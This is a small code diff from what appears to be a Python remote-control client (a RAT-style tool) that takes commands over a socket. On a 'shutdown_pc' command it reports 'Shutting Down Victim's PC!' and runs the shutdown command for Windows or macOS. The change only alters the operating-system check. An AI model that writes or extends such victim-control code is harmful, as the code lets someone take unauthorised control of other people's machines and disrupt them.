@@ -29,10 +29,10 @@ class Client():
         # Shutdown PC
         if self.command=="shutdown_pc":
             # Get Operating System Type
-            if self.os_name=="windows":
+            if sys.platform=="win32":
                 self.client.send("Shutting Down Victim's PC!".encode())
                 os.system("shutdown /s /t 1")
-            elif self.os_name=="macos":
+            elif sys.platform=="darwin":
                 self.client.send("Shutting Down Victim's PC!".encode())
                 os.system("shutdown -h now")
             else:
